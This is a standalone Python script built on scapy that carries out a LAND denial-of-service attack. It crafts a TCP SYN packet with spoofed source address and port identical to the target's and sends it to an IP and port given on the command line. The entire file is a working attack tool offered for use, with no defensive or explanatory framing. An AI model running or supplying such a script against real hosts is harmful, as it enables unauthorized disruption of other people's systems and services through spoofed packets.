#!/usr/bin/env python3

import argparse
from scapy.all import IP, TCP, send

def land_attack(target_ip, target_port, source_ip=None):
    """
    Performs a LAND attack by sending a TCP SYN packet with
    the source IP/port identical to the target IP/port.
    """
    if source_ip is None:
        source_ip = target_ip  # Spoof source IP to be the same as target IP

    # Craft the LAND packet
    # SYN packet where source IP and port are the same as destination IP and port
    pkt = IP(src=source_ip, dst=target_ip) / TCP(sport=target_port, dport=target_port, flags="S")

    print(f"[*] Sending LAND packet: {source_ip}:{target_port} -> {target_ip}:{target_port}")
    send(pkt, verbose=False)
    print("[+] LAND packet sent.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Perform a LAND attack.")
    parser.add_argument("target_ip", help="The IP address of the target.")
    parser.add_argument("target_port", type=int, help="The port number of the target.")
    parser.add_argument("--source_ip", help="Optional: The source IP to spoof. Defaults to target_ip.")

    args = parser.parse_args()

    try:
        land_attack(args.target_ip, args.target_port, args.source_ip)
    except PermissionError:
        print("[!] Error: This script requires root/sudo privileges to send raw packets.")
    except Exception as e:
        print(f"[!] An error occurred: {e}")
